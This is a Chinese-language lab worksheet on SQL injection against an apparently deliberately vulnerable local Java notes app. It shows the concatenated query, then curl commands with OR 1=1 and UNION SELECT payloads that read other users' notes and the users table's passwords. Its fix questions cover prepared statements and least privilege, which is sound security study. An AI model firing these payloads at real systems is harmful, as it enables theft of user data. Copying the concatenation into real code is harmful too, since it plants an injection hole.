# Lab 01 - SQL 注入

代码：`src/main/java/com/aqin/mynotes/lab/l01sqli/`

## 1. 漏洞在哪

```java
" AND title LIKE '%" + keyword + "%'"
```

## 2. 攻击复现

```bash
# 正常：只看到 alice 自己的笔记
curl -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search?keyword=todo'

# OR 1=1：看到所有人的笔记
curl -G -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search' --data-urlencode "keyword=' OR 1=1 --"

# UNION：把 users 表的密码拖出来
curl -G -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search' \
  --data-urlencode "keyword=' UNION SELECT id, id, username, password FROM users --"
```

拼接后的实际 SQL：（自己写出来）

## 3. 修复

- [ ] 为什么 `?` 占位符能防住？（提示：PreparedStatement、SQL 先编译、参数只当数据）
- [ ] 为什么还要转义 `%` 和 `_`？
- [ ] MyBatis 里 `#{}` 和 `${}` 的区别？`ORDER BY` 这种不能用占位符的地方怎么办？
- [ ] 数据库账号最小权限能挡住什么、挡不住什么？

## 4. 自己再扩展

- [ ] 布尔盲注 / 时间盲注（把接口改成只返回 count）
- [ ] 用 sqlmap 打一次 vuln 接口
- [ ] 回看自己过去的项目代码，有没有 `${}` 或字符串拼接 SQL

## 5. 心得
